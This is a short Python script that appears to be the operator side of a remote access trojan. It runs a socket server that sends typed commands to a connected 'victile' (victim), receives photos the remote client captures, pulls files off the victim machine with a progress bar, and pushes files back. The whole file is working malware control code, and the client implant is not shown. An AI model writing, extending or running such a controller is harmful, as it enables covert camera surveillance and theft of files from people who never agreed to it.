import socket
import os

import tqdm
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(("192.168.8.100",4559))
s.listen(5)
print("server listen")
client,addres = s.accept()
cont=5
while True:
    Rdata =client.recv(5000000)
    data = Rdata.decode("UTF-8",errors='ignore')
    if(data =="photo take and send"):
    
        file=open("D:/get/seif{}.jpeg".format(cont),'wb')
        file_bytes=b""
        done=False
        
        while not done:
             dataf =client.recv(500000)
            
             if (dataf.decode("utf-8",errors="ignore") =="i done"):
                 done=True
             else:
                 file_bytes += dataf
        file.write(file_bytes)
        file.close()
         
        cont +=1
        print("photo take")
    if(data == "file has ben crated"):
        datafn=input("entre file name :")
        datafn = datafn.encode("UTF-8")
        client.send(datafn)
        dataf=input("contien file = ")
        dataf=dataf.encode("UTF-8")
        client.send(dataf)
    
    if(data[-1]=="*"):
        file_name=data[:-1]
        print(file_name)
        filesize=client.recv(1024)
        filesize=filesize.decode("UTF-8")
        print(filesize)
        file = open("/Users/user/Desktop/{}".format(file_name),'wb')
        file_bytes=b""
        done=False
        prograse=tqdm.tqdm(unit="B",unit_scale=True,unit_divisor=1000,total=int(filesize))
        while not done:
            dataf =client.recv(500000)
            
            if (dataf.decode("utf-8",errors="ignore") =="i done"):
                  done=True
            else:
                  file_bytes += dataf
                  prograse.update(500000)
        file.write(file_bytes)
        file.close()
        msg1='i recive file sucsesfule'
        msg1=msg1.encode("UTF-8")
        client.send(msg1)
    print("{}  say :{}". format(addres,data))
    dataS =input("entre order to victile : ")
    dataS = dataS.encode("UTF-8")
    client.send(dataS)